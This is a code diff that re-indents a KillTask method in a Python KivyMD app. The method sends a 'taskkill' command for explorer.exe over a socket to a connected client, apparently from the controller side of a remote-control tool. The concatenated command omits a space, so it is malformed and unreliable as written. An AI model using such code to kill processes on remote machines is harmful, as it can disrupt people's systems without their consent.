@@ -237,14 +237,14 @@ class Main(MDApp):
             break
 
     def KillTask(self):
-    while True:
-        #procname = input('Enter Process Name: ')
-        command = 'taskkill /im' + 'explorer.exe'
-        self.currConn.send(command.encode())
-        print('Command sent to client: ', command)
-        output = self.currConn.recv(8096).decode()
-        print('Output: ', output)
-        break
+        while True:
+            #procname = input('Enter Process Name: ')
+            command = 'taskkill /im' + 'explorer.exe'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            output = self.currConn.recv(8096).decode()
+            print('Output: ', output)
+            break
 
 """
 
